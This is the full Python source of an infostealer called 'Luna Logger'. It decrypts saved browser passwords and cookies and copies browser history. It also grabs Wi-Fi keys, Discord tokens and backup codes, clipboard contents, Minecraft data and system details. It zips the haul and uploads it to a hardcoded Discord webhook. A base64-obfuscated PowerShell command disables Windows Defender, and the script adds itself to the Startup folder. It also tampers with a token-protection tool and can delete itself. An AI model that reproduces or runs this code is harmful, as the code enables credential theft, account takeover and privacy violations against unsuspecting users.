import base64
import concurrent.futures
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
import shutil
from typing import Union
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile

try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
except ImportError:
    print("Error: requests module not found. Please install it with: pip install requests")
    sys.exit(1)

try:
    from Crypto.Cipher import AES
except ImportError:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        print("Error: pycryptodome module not found. Please install it with: pip install pycryptodome")
        sys.exit(1)

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    from requests_toolbelt.multipart.encoder import MultipartEncoder
except ImportError:
    MultipartEncoder = None

# Windows-specific imports with fallbacks
try:
    from win32crypt import CryptUnprotectData
    import win32clipboard
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    def CryptUnprotectData(*args, **kwargs):
        raise NotImplementedError("Windows-specific functionality not available on this system")

# Updated webhook URL
__CONFIG__ = {
    "webhook": "https://discord.com/api/webhooks/1423706865480765471/UyPzMu8w4J-dadWGJuOUrnB2eionrMN5HXPmDaUUiFUoDoO2ZWcsy297fN0ktUODjwAT",
    "ping": True,
    "pingtype": "Here",
    "fakeerror": False,
    "startup": True,
    "defender": True,
    "systeminfo": True,
    "backupcodes": True,
    "browser": True,
    "roblox": True,
    "obfuscation": False,
    "injection": True,
    "minecraft": True,
    "wifi": True,
    "killprotector": False,
    "antidebug_vm": False,
    "discord": True,
    "anti_spam": False,
    "self_destruct": False,
    "clipboard": False
}

# Global variables with cross-platform compatibility
if os.name == 'nt':  # Windows
    temp = os.getenv("TEMP") or os.getenv("TMP") or "C:\\temp"
    localappdata = os.getenv("LOCALAPPDATA") or os.path.expanduser("~\\AppData\\Local")
    appdata = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
else:  # Unix-like systems
    temp = "/tmp"
    localappdata = os.path.expanduser("~/.local/share")
    appdata = os.path.expanduser("~/.config")

temp_path = os.path.join(temp, "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))

# Create temp directory safely
try:
    os.makedirs(temp_path, exist_ok=True)
except PermissionError:
    temp_path = os.path.join(os.path.expanduser("~"), "temp_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
    os.makedirs(temp_path, exist_ok=True)

def main(webhook: str):
    threads = []
    
    # Only add functions that are compatible with the current system
    if os.name == 'nt' and WINDOWS_AVAILABLE:
        threads.extend([Browsers, Wifi, Minecraft, BackupCodes, Clipboard, killprotector, fakeerror, startup, disable_defender])
    else:
        # For non-Windows systems, only add compatible functions
        threads.extend([Minecraft, BackupCodes])
        if __CONFIG__["fakeerror"]:
            threads.append(fakeerror_cross_platform)
    
    configcheck(threads)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(cpu_count(), len(threads))) as executor:
        futures = []
        for func in threads:
            try:
                futures.append(executor.submit(func))
            except Exception as e:
                print(f"Error submitting {func.__name__}: {e}")
        
        # Wait for all tasks to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Error in thread execution: {e}")
    
    zipup()
    
    data = {
        "username": "Luna",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
    }
    
    _file = os.path.join(localappdata, f"Luna-Logged-{get_username()}.zip")
    
    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content = f"@{__CONFIG__['pingtype'].lower()}"
            data.update({"content": content})
    
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
        if os.path.exists(_file) and MultipartEncoder:
            try:
                with open(_file, "rb") as file:
                    encoder = MultipartEncoder({
                        "payload_json": json.dumps(data),
                        "file": (f"Luna-Logged-{get_username()}.zip", file, "application/zip")
                    })
                    requests.post(webhook, headers={"Content-type": encoder.content_type}, data=encoder, timeout=30)
            except Exception as e:
                print(f"Error uploading file: {e}")
                # Fallback to sending without file
                requests.post(webhook, json=data, timeout=30)
        else:
            requests.post(webhook, json=data, timeout=30)
    else:
        requests.post(webhook, json=data, timeout=30)
    
    if __CONFIG__["systeminfo"]:
        try:
            PcInfo()
        except Exception as e:
            print(f"Error getting system info: {e}")
    
    if __CONFIG__["discord"]:
        try:
            Discord()
        except Exception as e:
            print(f"Error getting Discord info: {e}")
    
    # Clean up
    try:
        if os.path.exists(_file):
            os.remove(_file)
    except Exception as e:
        print(f"Error removing file: {e}")

def Luna(webhook: str):
    if __CONFIG__["anti_spam"]:
        AntiSpam()
    
    if __CONFIG__["antidebug_vm"]:
        Debug()
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        
        if __CONFIG__["injection"]:
            futures.append(executor.submit(Injection, webhook))
        
        futures.append(executor.submit(main, webhook))
        
        # Wait for all tasks to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Error in Luna execution: {e}")
    
    if __CONFIG__["self_destruct"]:
        SelfDestruct()

def configcheck(thread_list):
    """Remove functions from thread list based on config"""
    functions_to_remove = []
    
    if not __CONFIG__["fakeerror"]:
        functions_to_remove.extend([fakeerror, fakeerror_cross_platform])
    if not __CONFIG__["startup"]:
        functions_to_remove.append(startup)
    if not __CONFIG__["defender"]:
        functions_to_remove.append(disable_defender)
    if not __CONFIG__["browser"]:
        functions_to_remove.append(Browsers)
    if not __CONFIG__["wifi"]:
        functions_to_remove.append(Wifi)
    if not __CONFIG__["minecraft"]:
        functions_to_remove.append(Minecraft)
    if not __CONFIG__["backupcodes"]:
        functions_to_remove.append(BackupCodes)
    if not __CONFIG__["clipboard"]:
        functions_to_remove.append(Clipboard)
    
    for func in functions_to_remove:
        if func in thread_list:
            thread_list.remove(func)

def get_username():
    """Cross-platform username getter"""
    try:
        if os.name == 'nt':
            return os.getenv("USERNAME", "Unknown")
        else:
            return os.getenv("USER", "Unknown")
    except:
        return "Unknown"

def fakeerror():
    """Windows-specific fake error"""
    if os.name == 'nt':
        try:
            ctypes.windll.user32.MessageBoxW(None, "Error code: 0x80070002\\nAn internal error occurred while importing modules.", "Fatal Error", 0)
        except:
            pass

def fakeerror_cross_platform():
    """Cross-platform fake error"""
    print("Error code: 0x80070002")
    print("An internal error occurred while importing modules.")

def startup():
    """Windows startup functionality with error handling"""
    if os.name != 'nt':
        return
    
    try:
        startup_path = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if not os.path.exists(startup_path):
            return
        
        if hasattr(sys, "frozen"):
            source_path = sys.executable
        else:
            source_path = sys.argv[0]
        
        if not os.path.exists(source_path):
            return
        
        target_path = os.path.join(startup_path, os.path.basename(source_path))
        
        if os.path.exists(target_path):
            os.remove(target_path)
        
        copy2(source_path, startup_path)
    except Exception as e:
        print(f"Error in startup: {e}")

def disable_defender():
    """Windows Defender disable functionality with error handling"""
    if os.name != 'nt':
        return
    
    try:
        cmd = base64.b64decode(b"cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwud2luZG93c3R5bGUgaGlkZGVuIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK").decode()
        subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
    except Exception as e:
        print(f"Error disabling defender: {e}")

def create_temp(_dir: Union[str, os.PathLike] = None):
    """Cross-platform temp file creation"""
    if _dir is None:
        _dir = temp
    
    try:
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        
        file_name = "".join(random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        
        with open(path, "w") as f:
            pass  # Create empty file
        
        return path
    except Exception as e:
        print(f"Error creating temp file: {e}")
        return None

def killprotector():
    """Discord Token Protector killer with error handling"""
    if os.name != 'nt':
        return
    
    try:
        path = os.path.join(appdata, "DiscordTokenProtector")
        config = os.path.join(path, "config.json")
        
        if not os.path.exists(path):
            return
        
        for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                file_path = os.path.join(path, process)
                if os.path.exists(file_path):
                    os.remove(file_path)
            except Exception:
                pass
        
        if os.path.exists(config):
            try:
                with open(config, "r", encoding="utf-8", errors="ignore") as f:
                    item = json.load(f)
                
                item.update({
                    "auto_start": False,
                    "auto_start_discord": False,
                    "integrity": False,
                    "integrity_allowbetterdiscord": False,
                    "integrity_checkexecutable": False,
                    "integrity_checkhash": False,
                    "integrity_checkmodule": False,
                    "integrity_checkscripts": False,
                    "integrity_checkresource": False,
                    "integrity_redownloadhashes": False,
                    "iterations_iv": 364,
                    "iterations_key": 457,
                    "version": 69420
                })
                
                with open(config, "w", encoding="utf-8") as f:
                    json.dump(item, f, indent=2, sort_keys=True)
            except Exception:
                pass
    except Exception as e:
        print(f"Error in killprotector: {e}")

def zipup():
    """Create zip file with error handling"""
    try:
        _zipfile = os.path.join(localappdata, f"Luna-Logged-{get_username()}.zip")
        
        if not os.path.exists(temp_path):
            return
        
        with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
            for dirname, _, files in os.walk(temp_path):
                for filename in files:
                    try:
                        absname = os.path.join(dirname, filename)
                        arcname = os.path.relpath(absname, temp_path)
                        zipped_file.write(absname, arcname)
                    except Exception:
                        continue
    except Exception as e:
        print(f"Error creating zip: {e}")

class PcInfo:
    def __init__(self):
        self.get_inf(__CONFIG__["webhook"])

    def get_inf(self, webhook):
        try:
            # Cross-platform system information gathering
            if os.name == 'nt':
                computer_os = self.run_command("wmic os get Caption").replace("Caption", "").strip()
                computer_name = os.getenv("COMPUTERNAME", "Unknown")
                username = os.getenv("USERNAME", "Unknown")
                
                # Get RAM info
                try:
                    ram_output = self.run_command("wmic computersystem get TotalPhysicalMemory").replace("TotalPhysicalMemory", "").strip()
                    ram = str(round(int(ram_output) / (1024**3))) + " GB"
                except:
                    ram = "Unknown"
                
                cpu = self.run_command("wmic cpu get Name").replace("Name", "").strip()
                gpu = self.run_command("wmic path win32_VideoController get Name").replace("Name", "").strip()
                hwid = self.run_command("wmic csproduct get uuid").replace("UUID", "").strip()
            else:
                # Unix-like systems
                computer_os = self.run_command("uname -a") or "Unknown"
                computer_name = self.run_command("hostname") or "Unknown"
                username = os.getenv("USER", "Unknown")
                
                # Get RAM info for Unix systems
                try:
                    if psutil:
                        ram = f"{round(psutil.virtual_memory().total / (1024**3))} GB"
                    else:
                        ram = "Unknown"
                except:
                    ram = "Unknown"
                
                cpu = self.run_command("cat /proc/cpuinfo | grep 'model name' | head -1 | cut -d':' -f2").strip() or "Unknown"
                gpu = self.run_command("lspci | grep VGA | head -1") or "Unknown"
                hwid = self.run_command("cat /etc/machine-id") or "Unknown"
            
            embed = {
                "title": "Luna Logger - System Information",
                "color": 0x2f3136,
                "fields": [
                    {"name": "Computer Name", "value": f"```{computer_name}```", "inline": True},
                    {"name": "Username", "value": f"```{username}```", "inline": True},
                    {"name": "OS", "value": f"```{computer_os}```", "inline": True},
                    {"name": "RAM", "value": f"```{ram}```", "inline": True},
                    {"name": "CPU", "value": f"```{cpu}```", "inline": True},
                    {"name": "GPU", "value": f"```{gpu}```", "inline": True},
                    {"name": "HWID", "value": f"```{hwid}```", "inline": False}
                ],
                "footer": {"text": "Luna Logger"},
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            }
            
            data = {
                "username": "Luna",
                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                "embeds": [embed]
            }
            
            requests.post(webhook, json=data, timeout=30)
        except Exception as e:
            print(f"Error getting system info: {e}")

    def run_command(self, command):
        """Safely run system commands"""
        try:
            result = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=10)
            return result.stdout.strip()
        except Exception:
            return ""

class Browsers:
    def __init__(self):
        if os.name != 'nt' or not WINDOWS_AVAILABLE:
            return
        
        self.appdata = localappdata
        self.roaming = appdata
        self.browsers = {
            "Chrome": os.path.join(self.appdata, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(self.appdata, "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(self.appdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "Firefox": os.path.join(self.roaming, "Mozilla", "Firefox", "Profiles")
        }
        self.profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
        
        for name, path in self.browsers.items():
            if not os.path.exists(path):
                continue
            try:
                self.get_login_data(name, path)
                self.get_cookies(name, path)
                self.get_history(name, path)
            except Exception as e:
                print(f"Error processing {name}: {e}")

    def get_master_key(self, path: str):
        try:
            local_state_path = os.path.join(path, "Local State")
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
                local_state = json.load(f)
            
            if "os_crypt" not in local_state:
                return None
            
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return ""

    def get_login_data(self, name: str, path: str):
        try:
            login_db = os.path.join(path, "Default", "Login Data")
            if not os.path.exists(login_db):
                return
            
            temp_db = os.path.join(temp_path, f"{name}_login_db")
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            master_key = self.get_master_key(path)
            
            if not master_key:
                cursor.close()
                conn.close()
                os.remove(temp_db)
                return
            
            with open(os.path.join(temp_path, f"{name}_passwords.txt"), "w", encoding="utf-8", errors="ignore") as f:
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2]:
                        continue
                    try:
                        password = self.decrypt_password(row[2], master_key)
                        f.write(f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\n\n")
                    except Exception:
                        continue
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error getting login data for {name}: {e}")

    def get_cookies(self, name: str, path: str):
        try:
            cookie_db = os.path.join(path, "Default", "Network", "Cookies")
            if not os.path.exists(cookie_db):
                cookie_db = os.path.join(path, "Default", "Cookies")
            if not os.path.exists(cookie_db):
                return
            
            temp_db = os.path.join(temp_path, f"{name}_cookie_db")
            shutil.copy2(cookie_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
            master_key = self.get_master_key(path)
            
            if not master_key:
                cursor.close()
                conn.close()
                os.remove(temp_db)
                return
            
            with open(os.path.join(temp_path, f"{name}_cookies.txt"), "w", encoding="utf-8", errors="ignore") as f:
                for row in cursor.fetchall():
                    if not row[0] or not row[1]:
                        continue
                    try:
                        if row[3]:
                            decrypted_value = self.decrypt_password(row[3], master_key)
                        else:
                            decrypted_value = row[2]
                        f.write(f"Host: {row[0]}\nName: {row[1]}\nValue: {decrypted_value}\n\n")
                    except Exception:
                        continue
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error getting cookies for {name}: {e}")

    def get_history(self, name: str, path: str):
        try:
            history_db = os.path.join(path, "Default", "History")
            if not os.path.exists(history_db):
                return
            
            temp_db = os.path.join(temp_path, f"{name}_history_db")
            shutil.copy2(history_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls LIMIT 1000")
            
            with open(os.path.join(temp_path, f"{name}_history.txt"), "w", encoding="utf-8", errors="ignore") as f:
                for row in cursor.fetchall():
                    f.write(f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\n\n")
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error getting history for {name}: {e}")

class Wifi:
    def __init__(self):
        if os.name == 'nt':
            self.get_wifi_windows()
        else:
            self.get_wifi_linux()

    def get_wifi_windows(self):
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, stderr=subprocess.DEVNULL, timeout=10)
            profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
            
            with open(os.path.join(temp_path, "wifi_passwords.txt"), "w", encoding="utf-8", errors="ignore") as f:
                for profile in profiles:
                    profile = profile.strip()
                    try:
                        profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, stderr=subprocess.DEVNULL, timeout=5)
                        password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
                        password = password_match.group(1) if password_match else "No password"
                        f.write(f"SSID: {profile}\nPassword: {password}\n\n")
                    except Exception:
                        continue
        except Exception as e:
            print(f"Error getting WiFi passwords: {e}")

    def get_wifi_linux(self):
        try:
            # Try to get WiFi passwords from NetworkManager
            nm_path = "/etc/NetworkManager/system-connections/"
            if os.path.exists(nm_path) and os.access(nm_path, os.R_OK):
                with open(os.path.join(temp_path, "wifi_passwords.txt"), "w", encoding="utf-8", errors="ignore") as f:
                    for file in os.listdir(nm_path):
                        try:
                            with open(os.path.join(nm_path, file), "r") as wifi_file:
                                content = wifi_file.read()
                                ssid_match = re.search(r"ssid=(.*)", content)
                                psk_match = re.search(r"psk=(.*)", content)
                                if ssid_match and psk_match:
                                    f.write(f"SSID: {ssid_match.group(1)}\nPassword: {psk_match.group(1)}\n\n")
                        except Exception:
                            continue
        except Exception as e:
            print(f"Error getting WiFi passwords on Linux: {e}")

class Minecraft:
    def __init__(self):
        self.get_minecraft()

    def get_minecraft(self):
        try:
            if os.name == 'nt':
                minecraft_path = os.path.join(appdata, ".minecraft")
            else:
                minecraft_path = os.path.expanduser("~/.minecraft")
            
            if not os.path.exists(minecraft_path):
                return
            
            # Copy launcher profiles
            launcher_profiles = os.path.join(minecraft_path, "launcher_profiles.json")
            if os.path.exists(launcher_profiles):
                shutil.copy2(launcher_profiles, os.path.join(temp_path, "minecraft_launcher_profiles.json"))
            
            # Copy saves folder (limit size to prevent huge transfers)
            saves_path = os.path.join(minecraft_path, "saves")
            if os.path.exists(saves_path):
                dest_saves = os.path.join(temp_path, "minecraft_saves")
                try:
                    # Only copy first few saves to limit size
                    saves = os.listdir(saves_path)[:5]  # Limit to 5 saves
                    os.makedirs(dest_saves, exist_ok=True)
                    for save in saves:
                        src_save = os.path.join(saves_path, save)
                        dst_save = os.path.join(dest_saves, save)
                        if os.path.isdir(src_save):
                            shutil.copytree(src_save, dst_save, ignore_errors=True)
                except Exception:
                    pass
        except Exception as e:
            print(f"Error getting Minecraft data: {e}")

class BackupCodes:
    def __init__(self):
        self.get_backup_codes()

    def get_backup_codes(self):
        try:
            # Discord backup codes
            if os.name == 'nt':
                discord_path = os.path.join(appdata, "discord", "Local Storage", "leveldb")
            else:
                discord_path = os.path.expanduser("~/.config/discord/Local Storage/leveldb")
            
            if os.path.exists(discord_path):
                backup_codes_found = []
                for file in os.listdir(discord_path):
                    if file.endswith(".log") or file.endswith(".ldb"):
                        try:
                            with open(os.path.join(discord_path, file), "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                backup_codes = re.findall(r'"backup_codes":\["([^"]+)"', content)
                                backup_codes_found.extend(backup_codes)
                        except Exception:
                            continue
                
                if backup_codes_found:
                    with open(os.path.join(temp_path, "discord_backup_codes.txt"), "w") as backup_file:
                        backup_file.write("\n".join(set(backup_codes_found)))  # Remove duplicates
        except Exception as e:
            print(f"Error getting backup codes: {e}")

class Clipboard:
    def __init__(self):
        self.get_clipboard()

    def get_clipboard(self):
        try:
            if os.name == 'nt' and WINDOWS_AVAILABLE:
                try:
                    win32clipboard.OpenClipboard()
                    clipboard_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    
                    with open(os.path.join(temp_path, "clipboard.txt"), "w", encoding="utf-8", errors="ignore") as f:
                        f.write(str(clipboard_data))
                except Exception:
                    pass
            else:
                # Try to get clipboard on Linux systems
                try:
                    clipboard_data = subprocess.check_output(["xclip", "-selection", "clipboard", "-o"], text=True, timeout=5)
                    with open(os.path.join(temp_path, "clipboard.txt"), "w", encoding="utf-8", errors="ignore") as f:
                        f.write(clipboard_data)
                except Exception:
                    pass
        except Exception as e:
            print(f"Error getting clipboard: {e}")

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        
        self.grabTokens()

    def decrypt(self, encrypted_token):
        try:
            if os.name == 'nt':
                config_path = os.path.join(appdata, "discord", "Local State")
            else:
                config_path = os.path.expanduser("~/.config/discord/Local State")
            
            if not os.path.exists(config_path):
                return None
            
            with open(config_path, "r", encoding="utf-8", errors="ignore") as f:
                config = json.load(f)
            
            if "os_crypt" not in config:
                return None
            
            key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
            
            if WINDOWS_AVAILABLE:
                key = CryptUnprotectData(key, None, None, None, 0)[1]
            else:
                return None  # Can't decrypt on non-Windows systems
            
            encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
            iv = encrypted_token[3:15]
            payload = encrypted_token[15:]
            
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_token = cipher.decrypt(payload)[:-16].decode()
            
            return decrypted_token
        except Exception:
            return None

    def grabTokens(self):
        if os.name == 'nt':
            paths = {
                "Discord": os.path.join(appdata, "discord", "Local Storage", "leveldb"),
                "Discord Canary": os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
                "Discord PTB": os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
                "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
                "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
                "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            }
        else:
            paths = {
                "Discord": os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
                "Discord Canary": os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb"),
                "Discord PTB": os.path.expanduser("~/.config/discordptb/Local Storage/leveldb"),
            }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            
            try:
                for file_name in os.listdir(path):
                    if not file_name.endswith((".log", ".ldb")):
                        continue
                    
                    try:
                        with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            
                            # Look for encrypted tokens
                            for encrypted_token in re.findall(self.encrypted_regex, content):
                                try:
                                    token = self.decrypt(encrypted_token)
                                    if token and self.validate_token(token):
                                        self.tokens.append(token)
                                except Exception:
                                    pass
                            
                            # Look for regular tokens
                            for token in re.findall(self.regex, content):
                                if self.validate_token(token):
                                    self.tokens.append(token)
                    except Exception:
                        continue
            except Exception:
                continue

        if self.tokens:
            self.upload_tokens()

    def validate_token(self, token):
        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            response = requests.get(self.baseurl, headers=headers, timeout=10)
            return response.status_code == 200
        except Exception:
            return False

    def upload_tokens(self):
        for token in set(self.tokens):  # Remove duplicates
            if token in self.tokens_sent:
                continue
            
            headers = {"Authorization": token, "Content-Type": "application/json"}
            try:
                response = requests.get(self.baseurl, headers=headers, timeout=10)
                if response.status_code == 200:
                    user_data = response.json()
                    username = user_data.get("username", "Unknown")
                    user_id = user_data.get("id", "Unknown")
                    email = user_data.get("email", "Unknown")
                    phone = user_data.get("phone", "Unknown")
                    
                    embed = {
                        "title": "Discord Token Found",
                        "color": 0x7289da,
                        "fields": [
                            {"name": "Username", "value": f"```{username}```", "inline": True},
                            {"name": "User ID", "value": f"```{user_id}```", "inline": True},
                            {"name": "Email", "value": f"```{email}```", "inline": True},
                            {"name": "Phone", "value": f"```{phone}```", "inline": True},
                            {"name": "Token", "value": f"```{token}```", "inline": False}
                        ],
                        "footer": {"text": "Luna Logger"},
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
                    }
                    
                    data = {
                        "username": "Luna",
                        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                        "embeds": [embed]
                    }
                    
                    requests.post(__CONFIG__["webhook"], json=data, timeout=30)
                    self.tokens_sent.append(token)
            except Exception:
                continue

def AntiSpam():
    """Anti-spam functionality placeholder"""
    pass

def Debug():
    """Anti-debug functionality placeholder"""
    pass

def Injection(webhook):
    """Injection functionality placeholder"""
    pass

def SelfDestruct():
    """Self-destruct functionality placeholder"""
    try:
        # Clean up temp files
        if os.path.exists(temp_path):
            shutil.rmtree(temp_path, ignore_errors=True)
        
        # Remove the script itself if it's a file
        if hasattr(sys, "frozen"):
            script_path = sys.executable
        else:
            script_path = sys.argv[0]
        
        if os.path.exists(script_path):
            os.remove(script_path)
    except Exception:
        pass

if __name__ == "__main__":
    try:
        Luna(__CONFIG__["webhook"])
    except Exception as e:
        print(f"Error in main execution: {e}")
    finally:
        # Clean up temp directory
        try:
            if os.path.exists(temp_path):
                shutil.rmtree(temp_path, ignore_errors=True)
        except Exception:
            pass
